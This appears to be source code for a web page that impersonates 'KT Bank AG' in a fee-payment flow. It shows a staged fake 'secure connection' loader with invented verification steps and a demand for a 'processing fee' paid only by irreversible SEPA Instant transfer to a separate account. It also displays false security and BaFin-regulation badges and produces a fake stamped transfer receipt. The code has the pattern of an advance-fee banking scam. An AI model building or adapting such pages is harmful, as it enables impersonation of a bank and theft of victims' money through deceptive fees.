"use client";
import { useEffect, useState, useCallback, useRef, Suspense } from "react";
import { useSearchParams } from "next/navigation";
import { Check, Copy, FileText, ArrowLeft, AlertCircle, Building2, Clock, Printer, Lock, Shield, Wifi } from "lucide-react";

type FeePayment = { name: string; iban: string; bic: string; bank: string; reference: string };
type Transfer = { id: string; to_name: string; to_iban: string; amount: number; fee_amount: number; status: string; reference?: string; created_at: string };

function CopyField({ label, value, mono = false }: { label: string; value: string; mono?: boolean }) {
  const [copied, setCopied] = useState(false);
  function copy() {
    navigator.clipboard.writeText(value).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }
  return (
    <div style={{ marginBottom: 10 }}>
      <p style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.68rem", textTransform: "uppercase", letterSpacing: "0.07em", margin: "0 0 4px", fontWeight: 600 }}>{label}</p>
      <div style={{ display: "flex", alignItems: "center", gap: 8, background: "#252836", borderRadius: 10, padding: "10px 14px" }}>
        <span style={{ flex: 1, color: "white", fontFamily: mono ? "monospace" : "inherit", fontSize: "0.88rem", fontWeight: 500, wordBreak: "break-all" }}>{value}</span>
        <button onClick={copy}
          style={{ flexShrink: 0, display: "flex", alignItems: "center", gap: 4, background: copied ? "rgba(74,222,128,0.15)" : "rgba(255,255,255,0.08)", border: `1px solid ${copied ? "rgba(74,222,128,0.3)" : "rgba(255,255,255,0.12)"}`, borderRadius: 8, padding: "5px 10px", color: copied ? "#4ADE80" : "rgba(255,255,255,0.5)", fontSize: "0.72rem", fontWeight: 600, cursor: "pointer", transition: "all 0.2s", whiteSpace: "nowrap" }}>
          {copied ? <><Check size={11} /> Kopiert</> : <><Copy size={11} /> Kopieren</>}
        </button>
      </div>
    </div>
  );
}

function Bordereau({ transfer, profile }: { transfer: Transfer; profile: { prenom: string; nom: string; email: string } }) {
  const ref = `KT-${transfer.id.slice(0, 8).toUpperCase()}`;
  const date = new Date(transfer.created_at);
  return (
    <div style={{ maxWidth: 560, margin: "0 auto", padding: "0 0 80px" }}>
      {/* Success header */}
      <div style={{ textAlign: "center", padding: "32px 24px 24px" }}>
        <div style={{ width: 64, height: 64, borderRadius: "50%", background: "rgba(0,95,45,0.2)", border: "2px solid #005F2D", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
          <Check size={28} color="#4CAF82" />
        </div>
        <h1 style={{ color: "white", fontWeight: 800, fontSize: "1.3rem", margin: "0 0 6px" }}>Zahlungsbeleg eingereicht</h1>
        <p style={{ color: "rgba(255,255,255,0.45)", fontSize: "0.85rem", margin: 0, lineHeight: 1.6 }}>
          Ihr Überweisungsauftrag wird innerhalb von <strong style={{ color: "white" }}>48 Stunden</strong> bearbeitet.
        </p>
      </div>

      {/* Bordereau card */}
      <div style={{ margin: "0 20px", background: "#1A1D27", borderRadius: 18, border: "1px solid rgba(255,255,255,0.08)", overflow: "hidden" }} id="bordereau">
        {/* Bank header */}
        <div style={{ background: "linear-gradient(135deg, #001A0D 0%, #003319 60%, #005428 100%)", padding: "20px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div>
            <p style={{ color: "rgba(201,168,76,0.8)", fontSize: "0.65rem", fontWeight: 700, letterSpacing: "0.12em", textTransform: "uppercase", margin: "0 0 2px" }}>KT BANK AG</p>
            <p style={{ color: "rgba(255,255,255,0.35)", fontSize: "0.62rem", margin: 0 }}>Überweisungsauftrag</p>
          </div>
          <div style={{ textAlign: "right" }}>
            <p style={{ color: "rgba(255,255,255,0.5)", fontSize: "0.62rem", margin: "0 0 2px" }}>Ref.</p>
            <p style={{ color: "white", fontFamily: "monospace", fontWeight: 700, fontSize: "0.78rem", margin: 0 }}>{ref}</p>
          </div>
        </div>

        {/* Status badge */}
        <div style={{ padding: "12px 24px", borderBottom: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <Clock size={13} color="#D97706" />
            <span style={{ color: "#D97706", fontSize: "0.78rem", fontWeight: 600 }}>In Bearbeitung — erwartet in 48h</span>
          </div>
          <span style={{ color: "rgba(255,255,255,0.3)", fontSize: "0.68rem" }}>
            {date.toLocaleDateString("de-DE")} {date.toLocaleTimeString("de-DE", { hour: "2-digit", minute: "2-digit" })}
          </span>
        </div>

        {/* Details */}
        <div style={{ padding: "20px 24px" }}>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px 20px", marginBottom: 16 }}>
            {[
              ["Auftraggeber", `${profile.prenom} ${profile.nom}`],
              ["Betrag", `${Number(transfer.amount).toLocaleString("de-DE", { minimumFractionDigits: 2 })} EUR`],
              ["Empfänger", transfer.to_name],
              ["IBAN Empfänger", transfer.to_iban],
              ...(transfer.reference ? [["Verwendungszweck", transfer.reference]] : []),
            ].map(([k, v]) => (
              <div key={k} style={k === "IBAN Empfänger" || k === "Verwendungszweck" ? { gridColumn: "1 / -1" } : {}}>
                <p style={{ color: "rgba(255,255,255,0.3)", fontSize: "0.65rem", textTransform: "uppercase", letterSpacing: "0.06em", margin: "0 0 3px" }}>{k}</p>
                <p style={{ color: "white", fontWeight: 600, fontSize: "0.85rem", margin: 0, fontFamily: k === "IBAN Empfänger" ? "monospace" : "inherit" }}>{v}</p>
              </div>
            ))}
          </div>

          <div style={{ height: 1, background: "rgba(255,255,255,0.06)", margin: "16px 0" }} />

          {/* Bank stamp area */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <Building2 size={14} color="#4CAF82" />
              <span style={{ color: "rgba(255,255,255,0.35)", fontSize: "0.72rem" }}>KT Bank AG · Frankfurt am Main</span>
            </div>
            <div style={{ width: 44, height: 44, borderRadius: "50%", border: "2px solid rgba(0,95,45,0.4)", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <Check size={18} color="rgba(0,95,45,0.6)" />
            </div>
          </div>
        </div>
      </div>

      {/* Actions */}
      <div style={{ margin: "20px 20px 0", display: "flex", gap: 10 }}>
        <button onClick={() => window.print()}
          style={{ flex: 1, height: 46, background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, color: "rgba(255,255,255,0.7)", fontWeight: 600, fontSize: "0.85rem", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 7 }}>
          <Printer size={15} /> Drucken / Speichern
        </button>
        <button onClick={() => window.location.href = "/client/dashboard"}
          style={{ flex: 1, height: 46, background: "#005F2D", border: "none", borderRadius: 12, color: "white", fontWeight: 700, fontSize: "0.85rem", cursor: "pointer" }}>
          Zum Dashboard
        </button>
      </div>
    </div>
  );
}

const PORTAL_STEPS = [
  { label: "Verbindung zum Bankensystem", duration: 3000 },
  { label: "Transaktion wird verifiziert", duration: 4000 },
  { label: "Sicherheitsprotokoll wird geprüft", duration: 4500 },
  { label: "Koordinaten werden abgerufen", duration: 5000 },
  { label: "Verfügbare Bankverbindungen suchen", duration: 5500 },
  { label: "Sichere Verbindung wird aufgebaut", duration: 4000 },
  { label: "Portal wird initialisiert", duration: 3000 },
];

function PortalLoader({ onReady }: { onReady: () => void }) {
  const [stepIndex, setStepIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
  const totalDuration = PORTAL_STEPS.reduce((s, p) => s + p.duration, 0);
  const elapsedRef = useRef(0);
  const startRef = useRef(Date.now());

  useEffect(() => {
    const tick = setInterval(() => {
      const elapsed = Date.now() - startRef.current;
      elapsedRef.current = elapsed;
      const pct = Math.min(98, (elapsed / totalDuration) * 100);
      setProgress(pct);

      let acc = 0;
      let activeStep = 0;
      const done: number[] = [];
      for (let i = 0; i < PORTAL_STEPS.length; i++) {
        acc += PORTAL_STEPS[i].duration;
        if (elapsed > acc) {
          done.push(i);
          activeStep = Math.min(i + 1, PORTAL_STEPS.length - 1);
        }
      }
      setCompletedSteps(done);
      setStepIndex(activeStep);

      if (elapsed >= totalDuration) {
        clearInterval(tick);
        setProgress(100);
        setCompletedSteps(PORTAL_STEPS.map((_, i) => i));
        setTimeout(onReady, 600);
      }
    }, 80);
    return () => clearInterval(tick);
  }, [onReady, totalDuration]);

  return (
    <div style={{ minHeight: "100vh", background: "#0A0D14", fontFamily: "'Inter',sans-serif", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <div style={{ background: "#0F1219", borderBottom: "1px solid rgba(0,95,45,0.3)", padding: "14px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div style={{ width: 28, height: 28, borderRadius: 8, background: "rgba(0,95,45,0.3)", border: "1px solid rgba(0,95,45,0.5)", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <Lock size={13} color="#4CAF82" />
          </div>
          <div>
            <p style={{ color: "rgba(201,168,76,0.9)", fontSize: "0.7rem", fontWeight: 800, letterSpacing: "0.12em", textTransform: "uppercase", margin: 0 }}>KT BANK AG</p>
            <p style={{ color: "rgba(255,255,255,0.3)", fontSize: "0.58rem", margin: 0 }}>Zahlungsportal · Sichere Verbindung</p>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
          <Wifi size={11} color="#4CAF82" />
          <span style={{ color: "#4CAF82", fontSize: "0.65rem", fontWeight: 600 }}>TLS 1.3</span>
          <div style={{ width: 1, height: 12, background: "rgba(255,255,255,0.1)", margin: "0 4px" }} />
          <Shield size={11} color="rgba(255,255,255,0.3)" />
          <span style={{ color: "rgba(255,255,255,0.3)", fontSize: "0.65rem" }}>256-bit AES</span>
        </div>
      </div>

      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "40px 24px" }}>
        {/* Central spinner */}
        <div style={{ position: "relative", width: 90, height: 90, marginBottom: 32 }}>
          <svg width="90" height="90" style={{ position: "absolute", inset: 0, animation: "spin 2s linear infinite" }}>
            <circle cx="45" cy="45" r="38" fill="none" stroke="rgba(0,95,45,0.15)" strokeWidth="4" />
            <circle cx="45" cy="45" r="38" fill="none" stroke="#005F2D" strokeWidth="4" strokeLinecap="round"
              strokeDasharray={`${progress * 2.39} 239`} strokeDashoffset="0" style={{ transition: "stroke-dasharray 0.3s ease" }} />
          </svg>
          <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
            <div style={{ width: 52, height: 52, borderRadius: "50%", background: "rgba(0,95,45,0.2)", border: "1px solid rgba(0,95,45,0.4)", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <Lock size={20} color="#4CAF82" />
            </div>
          </div>
        </div>
        <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>

        <p style={{ color: "white", fontWeight: 700, fontSize: "1.05rem", margin: "0 0 6px", textAlign: "center" }}>
          Sicheres Zahlungsportal wird geladen
        </p>
        <p style={{ color: "rgba(255,255,255,0.35)", fontSize: "0.8rem", margin: "0 0 32px", textAlign: "center" }}>
          Bitte warten — Bankdaten werden sicher abgerufen…
        </p>

        {/* Progress bar */}
        <div style={{ width: "100%", maxWidth: 400, height: 4, background: "rgba(255,255,255,0.07)", borderRadius: 99, marginBottom: 28, overflow: "hidden" }}>
          <div style={{ height: "100%", background: "linear-gradient(90deg, #005F2D, #4CAF82)", borderRadius: 99, width: `${progress}%`, transition: "width 0.3s ease" }} />
        </div>

        {/* Steps */}
        <div style={{ width: "100%", maxWidth: 400, display: "flex", flexDirection: "column", gap: 8 }}>
          {PORTAL_STEPS.map((step, i) => {
            const done = completedSteps.includes(i);
            const active = stepIndex === i && !done;
            return (
              <div key={i} style={{ display: "flex", alignItems: "center", gap: 10, opacity: done || active ? 1 : 0.25, transition: "opacity 0.4s" }}>
                <div style={{ width: 18, height: 18, borderRadius: "50%", background: done ? "rgba(74,222,128,0.2)" : active ? "rgba(0,95,45,0.3)" : "rgba(255,255,255,0.06)", border: `1px solid ${done ? "#4ADE80" : active ? "#005F2D" : "rgba(255,255,255,0.1)"}`, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                  {done ? <Check size={10} color="#4ADE80" /> : active ? <div style={{ width: 6, height: 6, borderRadius: "50%", background: "#4CAF82", animation: "pulse 1s infinite" }} /> : null}
                </div>
                <span style={{ color: done ? "rgba(255,255,255,0.6)" : active ? "white" : "rgba(255,255,255,0.25)", fontSize: "0.78rem", fontWeight: active ? 600 : 400 }}>{step.label}</span>
                {active && <span style={{ marginLeft: "auto", color: "#4CAF82", fontSize: "0.65rem", fontWeight: 600 }}>En cours…</span>}
                {done && <span style={{ marginLeft: "auto", color: "rgba(74,222,128,0.6)", fontSize: "0.65rem" }}>✓</span>}
              </div>
            );
          })}
        </div>

        <p style={{ color: "rgba(255,255,255,0.15)", fontSize: "0.7rem", marginTop: 32, textAlign: "center" }}>
          KT Bank AG · Frankfurt am Main · Reguliert durch BaFin
        </p>
      </div>
    </div>
  );
}

function TransferPaymentInner() {
  const params = useSearchParams();
  const transferId = params.get("id");

  const [token, setToken] = useState<string | null>(null);
  const [profile, setProfile] = useState<{ prenom: string; nom: string; email: string } | null>(null);
  const [transfer, setTransfer] = useState<Transfer | null>(null);
  const [feePayment, setFeePayment] = useState<FeePayment | null>(null);
  const [loading, setLoading] = useState(true);
  const [portalReady, setPortalReady] = useState(false);
  const [error, setError] = useState("");

  const [proofFile, setProofFile] = useState<File | null>(null);
  const [paymentRef, setPaymentRef] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [done, setDone] = useState(false);

  const fetchTransfer = useCallback(async (tk: string, id: string) => {
    // Try sessionStorage first for fee_payment
    const cached = sessionStorage.getItem("kt_transfer_payment");
    if (cached) {
      try {
        const parsed = JSON.parse(cached);
        if (parsed.transferId === id) {
          setFeePayment(parsed.feePayment);
        }
      } catch {
        // ignore
      }
    }

    const res = await fetch(`/api/kt/client/transfer?id=${id}`, {
      headers: { Authorization: `Bearer ${tk}` },
    });
    if (!res.ok) { setError("Virement introuvable"); setLoading(false); return; }
    const d = await res.json();
    setTransfer(d.transfer);
    if (d.fee_payment) setFeePayment(d.fee_payment);
    setLoading(false);
  }, []);

  useEffect(() => {
    const tk = sessionStorage.getItem("kt_token");
    if (!tk) { window.location.href = "/client/login"; return; }
    setToken(tk);

    const profileRaw = sessionStorage.getItem("kt_profile");
    if (profileRaw) {
      try { setProfile(JSON.parse(profileRaw)); } catch { /* ignore */ }
    }

    if (!transferId) { setError("Kein Überweisungsauftrag gefunden"); setLoading(false); return; }
    fetchTransfer(tk, transferId);
  }, [transferId, fetchTransfer]);

  async function submit() {
    if (!token || !transferId || !proofFile) return;
    setSubmitting(true);
    const fd = new FormData();
    fd.append("transfer_id", transferId);
    if (paymentRef) fd.append("payment_reference", paymentRef);
    fd.append("file", proofFile);
    await fetch("/api/kt/client/transfer/proof", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}` },
      body: fd,
    });
    sessionStorage.removeItem("kt_transfer_payment");
    try { localStorage.removeItem("kt_pending_transfer"); } catch { /* ignore */ }
    setSubmitting(false);
    setDone(true);
  }

  if (done && transfer && profile) return (
    <div style={{ minHeight: "100vh", background: "#14161F", fontFamily: "'Inter',sans-serif" }}>
      <div style={{ background: "#1A1D27", borderBottom: "1px solid rgba(255,255,255,0.06)", padding: "14px 20px", display: "flex", alignItems: "center" }}>
        <span style={{ color: "rgba(201,168,76,0.8)", fontSize: "0.75rem", fontWeight: 700, letterSpacing: "0.1em" }}>KT BANK</span>
      </div>
      <Bordereau transfer={transfer} profile={profile} />
    </div>
  );

  // Show portal loader until animation completes (~29s); data will be ready well before then
  if (!portalReady) {
    return <PortalLoader onReady={() => setPortalReady(true)} />;
  }

  return (
    <div style={{ minHeight: "100vh", background: "#0A0D14", fontFamily: "'Inter',sans-serif" }}>
      {/* Secure portal header */}
      <div style={{ background: "#0F1219", borderBottom: "1px solid rgba(0,95,45,0.3)", padding: "14px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <button onClick={() => window.history.back()} style={{ background: "none", border: "none", color: "rgba(255,255,255,0.4)", cursor: "pointer", display: "flex", alignItems: "center", gap: 5, fontSize: "0.8rem", padding: 0 }}>
            <ArrowLeft size={15} />
          </button>
          <div style={{ width: 1, height: 16, background: "rgba(255,255,255,0.1)", margin: "0 6px" }} />
          <div style={{ width: 26, height: 26, borderRadius: 7, background: "rgba(0,95,45,0.3)", border: "1px solid rgba(0,95,45,0.5)", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <Lock size={12} color="#4CAF82" />
          </div>
          <div>
            <p style={{ color: "rgba(201,168,76,0.9)", fontSize: "0.68rem", fontWeight: 800, letterSpacing: "0.12em", textTransform: "uppercase", margin: 0 }}>KT BANK AG</p>
            <p style={{ color: "rgba(255,255,255,0.3)", fontSize: "0.57rem", margin: 0 }}>Sicheres Zahlungsportal</p>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
          <div style={{ width: 6, height: 6, borderRadius: "50%", background: "#4ADE80", boxShadow: "0 0 0 3px rgba(74,222,128,0.15)" }} />
          <span style={{ color: "#4ADE80", fontSize: "0.65rem", fontWeight: 600 }}>Koordinaten verfügbar</span>
        </div>
      </div>

      <div style={{ maxWidth: 540, margin: "0 auto", padding: "24px 20px 80px" }}>
        {error ? (
          <div style={{ background: "rgba(248,113,113,0.1)", border: "1px solid rgba(248,113,113,0.25)", borderRadius: 14, padding: "16px 20px", display: "flex", gap: 10, alignItems: "flex-start", marginTop: 24 }}>
            <AlertCircle size={18} color="#F87171" style={{ flexShrink: 0, marginTop: 1 }} />
            <p style={{ color: "#F87171", fontSize: "0.85rem", margin: 0 }}>{error}</p>
          </div>
        ) : transfer && feePayment ? (
          <>
            {/* Title */}
            <div style={{ marginBottom: 20 }}>
              <h1 style={{ color: "white", fontWeight: 800, fontSize: "1.2rem", margin: "0 0 4px" }}>Bearbeitungsgebühr zahlen</h1>
              <p style={{ color: "rgba(255,255,255,0.35)", fontSize: "0.8rem", margin: 0, lineHeight: 1.6 }}>
                Überweisen Sie die Gebühr auf das unten angezeigte Konto und laden Sie Ihren Beleg hoch.
              </p>
            </div>

            {/* Amount to pay banner */}
            <div style={{ background: "rgba(217,119,6,0.12)", border: "1px solid rgba(217,119,6,0.3)", borderRadius: 14, padding: "14px 18px", marginBottom: 12, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <div>
                <p style={{ color: "rgba(255,255,255,0.45)", fontSize: "0.68rem", textTransform: "uppercase", letterSpacing: "0.07em", margin: "0 0 3px" }}>Zu zahlende Gebühr</p>
                <p style={{ color: "#FCD34D", fontWeight: 800, fontSize: "1.4rem", margin: 0 }}>{Number(transfer.fee_amount).toLocaleString("de-DE", { minimumFractionDigits: 2 })} EUR</p>
              </div>
              <div style={{ textAlign: "right" }}>
                <p style={{ color: "rgba(255,255,255,0.3)", fontSize: "0.68rem", margin: "0 0 2px" }}>Überweisungsbetrag</p>
                <p style={{ color: "rgba(255,255,255,0.6)", fontWeight: 600, fontSize: "0.85rem", margin: 0 }}>{Number(transfer.amount).toLocaleString("de-DE", { minimumFractionDigits: 2 })} EUR → {transfer.to_name}</p>
              </div>
            </div>

            {/* Instant transfer notice */}
            <div style={{ background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.35)", borderRadius: 10, padding: "10px 14px", marginBottom: 16, display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ fontSize: "1rem", flexShrink: 0 }}>⚡</span>
              <p style={{ color: "#FCA5A5", fontSize: "0.78rem", margin: 0, lineHeight: 1.5 }}>
                <strong style={{ color: "#F87171" }}>Sofortüberweisung erforderlich</strong> — Bitte nutzen Sie ausschließlich die <strong style={{ color: "#F87171" }}>Echtzeitüberweisung (SEPA Instant)</strong>. Standardüberweisungen werden nicht akzeptiert.
              </p>
            </div>

            {/* Bank coordinates — secure portal style */}
            <div style={{ background: "#111420", borderRadius: 16, border: "1px solid rgba(0,95,45,0.3)", padding: "18px 20px", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 14 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <Building2 size={14} color="#4CAF82" />
                  <p style={{ color: "white", fontWeight: 700, fontSize: "0.88rem", margin: 0 }}>Bankverbindung für die Gebühr</p>
                </div>
                <span style={{ display: "flex", alignItems: "center", gap: 4, background: "rgba(74,222,128,0.1)", border: "1px solid rgba(74,222,128,0.2)", borderRadius: 20, padding: "2px 8px" }}>
                  <Lock size={9} color="#4CAF82" />
                  <span style={{ color: "#4CAF82", fontSize: "0.62rem", fontWeight: 600 }}>Gesichert</span>
                </span>
              </div>
              {feePayment.name && <CopyField label="Begünstigter" value={feePayment.name} />}
              {feePayment.iban && <CopyField label="IBAN" value={feePayment.iban} mono />}
              {feePayment.bic && <CopyField label="BIC / SWIFT" value={feePayment.bic} mono />}
              {feePayment.bank && <CopyField label="Bank" value={feePayment.bank} />}
              {feePayment.reference && <CopyField label="Verwendungszweck" value={feePayment.reference} />}
              <CopyField label="Betrag" value={`${Number(transfer.fee_amount).toFixed(2)} EUR`} />
            </div>

            {/* Proof upload */}
            <div style={{ background: "#111420", borderRadius: 16, border: "1px solid rgba(255,255,255,0.07)", padding: "18px 20px", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 14 }}>
                <FileText size={14} color="#4CAF82" />
                <p style={{ color: "white", fontWeight: 700, fontSize: "0.88rem", margin: 0 }}>Zahlungsnachweis einreichen</p>
              </div>

              <div style={{ marginBottom: 12 }}>
                <label style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.68rem", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.06em", display: "block", marginBottom: 5 }}>
                  Überweisungsreferenz <span style={{ color: "rgba(255,255,255,0.2)", fontWeight: 400, textTransform: "none" }}>(optional)</span>
                </label>
                <input type="text" placeholder="z.B. TRF-2025-0001"
                  value={paymentRef} onChange={(e) => setPaymentRef(e.target.value)}
                  style={{ width: "100%", height: 42, background: "#1A1D27", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 10, color: "white", fontSize: "0.85rem", padding: "0 14px", boxSizing: "border-box", outline: "none" }} />
              </div>

              <div>
                <label style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.68rem", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.06em", display: "block", marginBottom: 5 }}>
                  Zahlungsbeleg <span style={{ color: "#D97706", fontWeight: 700, textTransform: "none", fontSize: "0.72rem" }}>* obligatoire</span>
                </label>
                <label style={{
                  display: "flex", alignItems: "center", gap: 10, minHeight: 52,
                  background: proofFile ? "rgba(0,95,45,0.1)" : "#1A1D27",
                  border: `2px dashed ${proofFile ? "#4CAF82" : "rgba(255,255,255,0.1)"}`,
                  borderRadius: 10, padding: "12px 16px", cursor: "pointer", boxSizing: "border-box",
                }}>
                  <input type="file" accept="image/*,application/pdf" style={{ display: "none" }}
                    onChange={(e) => setProofFile(e.target.files?.[0] ?? null)} />
                  {proofFile
                    ? <><Check size={15} color="#4CAF82" /><span style={{ color: "#4CAF82", fontSize: "0.82rem", fontWeight: 600, wordBreak: "break-all" }}>{proofFile.name}</span></>
                    : <><FileText size={15} color="rgba(255,255,255,0.25)" /><span style={{ color: "rgba(255,255,255,0.3)", fontSize: "0.8rem" }}>Datei auswählen (JPG, PNG, PDF · max. 5 MB)</span></>
                  }
                </label>
              </div>
            </div>

            <p style={{ color: "rgba(255,255,255,0.25)", fontSize: "0.73rem", lineHeight: 1.6, marginBottom: 14, textAlign: "center" }}>
              Nach Einreichung prüft unser Team Ihren Beleg. Ihr Virement wird innerhalb von <strong style={{ color: "rgba(255,255,255,0.5)" }}>48 Stunden</strong> bearbeitet.
            </p>

            {!proofFile && (
              <p style={{ color: "#D97706", fontSize: "0.76rem", textAlign: "center", margin: "0 0 10px", display: "flex", alignItems: "center", justifyContent: "center", gap: 5 }}>
                <AlertCircle size={13} /> Ein Zahlungsbeleg ist erforderlich.
              </p>
            )}
            <button onClick={submit} disabled={submitting || !proofFile}
              style={{ width: "100%", height: 52, background: proofFile ? "#005F2D" : "rgba(0,95,45,0.3)", border: proofFile ? "none" : "1px solid rgba(0,95,45,0.4)", borderRadius: 14, color: "white", fontWeight: 700, fontSize: "0.95rem", cursor: (submitting || !proofFile) ? "not-allowed" : "pointer", opacity: (submitting || !proofFile) ? 0.6 : 1, display: "flex", alignItems: "center", justifyContent: "center", gap: 8, transition: "all 0.2s" }}>
              {submitting ? "Wird gesendet…" : <><Lock size={15} /> Zahlungsbeleg sicher einreichen</>}
            </button>
            <p style={{ color: "rgba(255,255,255,0.15)", fontSize: "0.65rem", textAlign: "center", marginTop: 10 }}>
              KT Bank AG · Frankfurt · Reguliert durch BaFin · TLS 1.3 verschlüsselt
            </p>
          </>
        ) : null}
      </div>
    </div>
  );
}

export default function TransferPaymentPage() {
  return (
    <Suspense fallback={<div style={{ minHeight: "100vh", background: "#14161F", display: "flex", alignItems: "center", justifyContent: "center", color: "rgba(255,255,255,0.3)", fontFamily: "'Inter',sans-serif" }}>Wird geladen…</div>}>
      <TransferPaymentInner />
    </Suspense>
  );
}
